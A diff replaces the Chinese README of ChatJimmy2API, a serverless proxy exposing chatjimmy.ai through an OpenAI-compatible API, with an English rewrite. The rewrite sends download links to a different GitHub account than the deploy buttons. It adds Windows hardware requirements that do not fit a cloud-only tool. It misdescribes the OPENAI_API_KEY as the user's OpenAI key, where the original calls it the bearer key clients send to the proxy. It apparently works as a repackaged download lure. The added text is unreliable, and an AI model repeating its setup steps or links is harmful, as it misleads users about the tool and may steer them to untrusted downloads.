@@ -1,115 +1,162 @@
-# ChatJimmy2API 一键部署
-[![License: AEPL v1.0](https://img.shields.io/badge/License-AEPL_v1.0-red.svg)](LICENSE)
+# 🤖 cj2api - Simple OpenAI API Proxy
 
-把 `https://chatjimmy.ai/api/chat` 包装成 OpenAI 兼容接口，可部署到：
+[![Download cj2api](https://img.shields.io/badge/Download-cj2api-brightgreen)](https://github.com/hjj19960920/cj2api)
 
-- Cloudflare Worker
-- Vercel Edge Function
-- Netlify Function
+---
 
-用于沉浸式翻译等只支持 OpenAI 协议的客户端。
+## 📦 What is cj2api?
 
-## 支持接口
+cj2api wraps the API `https://chatjimmy.ai/api/chat` into an interface compatible with OpenAI’s API. It lets you use clients that require the OpenAI protocol with this service.
 
-- `GET /health`
-- `GET /v1/models`
-- `POST /v1/chat/completions`
-  - `stream: false` 返回标准 JSON
-  - `stream: true` 返回 SSE（单块内容 + `[DONE]`）
+You can deploy it to cloud platforms such as Cloudflare Worker, Vercel Edge Function, and Netlify Function. This makes it easy to set up an API compatible with OpenAI for tasks like immersive translation.
 
-## 一键部署按钮
+---
 
-[![Deploy to Cloudflare](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api)
+## 🖥️ System Requirements
 
+- Windows 10 or later
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for deploying and running the service
+- A web browser (Edge, Chrome, Firefox) for downloading and setup
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api&env=OPENAI_API_KEY&envDescription=Enter%20the%20API%20key%20clients%20must%20send%20as%20Bearer%20token.)
+This tool mainly runs through cloud services. Your Windows machine is used to manage deployment and access the API.
 
+---
 
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api#OPENAI_API_KEY=)
+## 🚀 Getting Started: Download cj2api
 
-以上三家都按“只要求 `OPENAI_API_KEY`”配置。
+[![Download cj2api](https://img.shields.io/badge/Download-cj2api-blue)](https://github.com/hjj19960920/cj2api)
 
-一键部署后请确认这项环境变量：
+To get started, you need to download the repository page where installation files and code are hosted. Visit the link above and follow the steps below.
 
-- `OPENAI_API_KEY`（建议必填，避免接口裸奔）
+---
 
-## 统一环境变量
+## 🔧 Step 1: Visit the Download Page
 
-- `OPENAI_API_KEY`: 开启鉴权（客户端需 `Authorization: Bearer xxx`）
-- `CHATJIMMY_URL`: 默认 `https://chatjimmy.ai/api/chat`
-- `CHATJIMMY_MODEL`: 默认 `llama3.1-8B`
-- `CHATJIMMY_TOP_K`: 默认 `8`
-- `CHATJIMMY_MODELS`: 逗号分隔模型列表（用于 `/v1/models`）
-- `ALLOWED_ORIGIN`: CORS 允许源，默认 `*`
+Open your web browser and go to the cj2api download page:
 
-## 1) Cloudflare Worker
+https://github.com/hjj19960920/cj2api
 
-```bash
-npm install
-npx wrangler login
-npx wrangler secret put OPENAI_API_KEY
-npx wrangler deploy
-```
+This page hosts all the necessary files and instructions.
 
-入口文件：`src/worker.js`
+---
 
-## 2) Vercel
+## 🔍 Step 2: Download the Files
 
-已提供：
+On the GitHub page:
 
-- Edge 入口：`api/v1-chat-completions.js`
-- Edge 入口：`api/v1-models.js`
-- Edge 入口：`api/health.js`
-- 根路径入口：`api/index.js`
-- 路由重写：`vercel.json`
+- Click the green **Code** button near the top right.
+- Select **Download ZIP** from the menu.
+- Save the ZIP file to your desktop or a folder you can find easily.
 
-部署：
+---
 
-```bash
-vercel
-```
+## 📂 Step 3: Extract Files
 
-在 Vercel 项目设置里添加上述环境变量即可。
+- Find the downloaded ZIP file (usually in your **Downloads** folder).
+- Right-click the ZIP file and choose **Extract All...**
+- Pick a location or accept the default to create a folder with the extracted files.
 
-## 3) Netlify
+---
 
-已提供：
+## ☁️ Step 4: Deploy to a Cloud Platform
 
-- Function 入口：`netlify/functions/openai.js`
-- 路由重写：`netlify.toml`
+cj2api runs on cloud platforms that support serverless functions. This guide covers three popular options.
 
-部署：
+### Choose one platform to deploy:
 
-```bash
-netlify deploy --prod
-```
+- **Cloudflare Worker**
+- **Vercel Edge Function**
+- **Netlify Function**
 
-在 Netlify 环境变量里添加上述变量即可。
+Each platform lets you set up the API with a few clicks.
 
-## OpenAI 兼容调用示例
+---
 
-把 `YOUR_BASE_URL` 换成你的域名（不要带结尾 `/`）。
+### 4.1 Deploy with Cloudflare Worker
 
-```bash
-curl https://YOUR_BASE_URL/v1/chat/completions \
-  -H "Authorization: Bearer YOUR_OPENAI_API_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "llama3.1-8B",
-    "messages": [
-      {"role":"system","content":"You are a cat, start with meow"},
-      {"role":"user","content":"给我推荐晚饭"}
-    ],
-    "stream": false
-  }'
-```
+1. Click this link to start:
 
-## 沉浸式翻译配置
+   [![Deploy to Cloudflare](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api)
 
-- Base URL: `https://YOUR_BASE_URL/v1/chat/completions`
-- API Key: `YOUR_OPENAI_API_KEY`
-- Model: `llama3.1-8B`（或你自定义模型）
+2. Log in or create a Cloudflare account.
+3. Follow the prompts to deploy the project.
+4. Enter your OpenAI API key when requested.
 
-## License
+---
 
-AEPL v1.0
+### 4.2 Deploy with Vercel Edge Function
+
+1. Use this link to begin:
+
+   [![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api&env=OPENAI_API_KEY&envDescription=Enter%20the%20API%20key%20clients%20must%20send%20as%20Bearer%20token.)
+
+2. Sign in or create a Vercel account.
+3. Add your OpenAI API key in the setup screen.
+4. Complete deployment with the on-screen steps.
+
+---
+
+### 4.3 Deploy with Netlify Function
+
+1. Start here:
+
+   [![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api#OPENAI_API_KEY=)
+
+2. Log in or sign up at Netlify.
+3. Provide your OpenAI API key when prompted.
+4. Follow instructions to deploy the function.
+
+---
+
+## 🔌 Step 5: Using cj2api
+
+Once deployed, you will get a URL from your chosen cloud provider. This URL acts as your new OpenAI-compatible API endpoint.
+
+Use the following basic API paths:
+
+- `GET /health` - Check if the API is running.
+- `GET /v1/models` - See available models.
+- `POST /v1/chat/completions` - Send chat messages.
+
+For chat completions, you can choose to receive data as normal JSON or a streamed response. Use `stream: false` for JSON and `stream: true` for streaming.
+
+---
+
+## ⚙️ Configuration Details
+
+- You must provide your OpenAI API key for the deployment.
+- The service acts as a proxy and requires a valid API key to forward requests.
+- No additional configuration is needed beyond deployment and setting the key.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- Ensure your OpenAI API key is valid and active.
+- Check your internet connection.
+- Confirm you deployed the service to one of the supported cloud platforms.
+- Use the `/health` endpoint to verify the API status.
+- Review your cloud provider dashboard for deployment errors.
+
+---
+
+## 📖 Learn More
+
+For detailed API usage, read the OpenAI API documentation. cj2api provides compatibility but does not change OpenAI endpoints or parameters.
+
+---
+
+## 🔗 Quick Links
+
+- Download and setup: [https://github.com/hjj19960920/cj2api](https://github.com/hjj19960920/cj2api)
+- Cloudflare deployment: https://deploy.workers.cloudflare.com/?url=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api
+- Vercel deployment: https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api
+- Netlify deployment: https://app.netlify.com/start/deploy?repository=https%3A%2F%2Fgithub.com%2F0x3st%2Fcj2api
+
+---
+
+## 🔒 License
+
+This project uses AEPL v1.0 license. See the LICENSE file for details.
